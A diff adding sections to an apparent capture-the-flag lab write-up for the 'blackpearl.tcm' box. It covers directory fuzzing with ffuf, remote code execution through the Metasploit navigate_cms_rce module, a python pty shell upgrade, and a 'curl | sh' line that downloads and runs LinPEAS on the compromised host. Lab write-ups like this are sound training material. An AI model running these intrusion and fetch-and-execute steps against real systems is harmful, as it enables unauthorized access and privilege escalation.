@@ -102,5 +102,55 @@ ffuf -u http://192.168.38.128:80/FUZZ -w /usr/share/wordlists/dirbuster/director
 
 <img width="1229" height="932" alt="image" src="https://github.com/user-attachments/assets/9c0fd118-79a6-420f-aa96-4101ec82f6ee" />
 
+- Let’s try directory FUZZing again, maybe we’ll find something interesting this time.
 
+```bash
+ffuf -u http://blackpearl.tcm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+<img width="1083" height="890" alt="image" src="https://github.com/user-attachments/assets/3f4af214-3112-4d30-9017-0044a838c6d6" />
+<img width="1314" height="986" alt="image" src="https://github.com/user-attachments/assets/281dda9d-f656-4955-b899-ee98538a11d7" />
+
+---
+
+## Gaining Access (Exploitation)
+
+- The *navigate* directory showed a login page for Navigate CMS v2.8. After checking the version, I found a Metasploit module that targets this CMS.
+  (https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/)
+
+  <img width="1263" height="677" alt="image" src="https://github.com/user-attachments/assets/ec195d48-4290-4d05-b662-7d31f6745d71" />
+
+```bash
+  sudo msfconsole
+use exploit/multi/http/navigate_cms_rce      
+set RHOSTS 192.168.38.128    
+set VHOST blackpearl.tcm    
+run    
+```
+
+  <img width="1219" height="826" alt="image" src="https://github.com/user-attachments/assets/391d55bd-5bb3-486d-b48f-a802a5f023bf" />
+
+
+  ```bash
+shell  
+whoami
+# for interactive shell use below
+python3 -c 'import pty;pty.spawn("/bin/bash")' 
+```
+
+<img width="311" height="128" alt="image" src="https://github.com/user-attachments/assets/7405b2dc-cf5f-4b84-873e-d2ed3184acc7" />
+
+
+---
+
+## Maintaining Access (Privilege Escalation)  
+
+-  We will use LinPEAS, a Linux script that helps gather useful information for identifying potential privilege-escalation possibilites.
   
+(https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
+
+```bash
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+
+
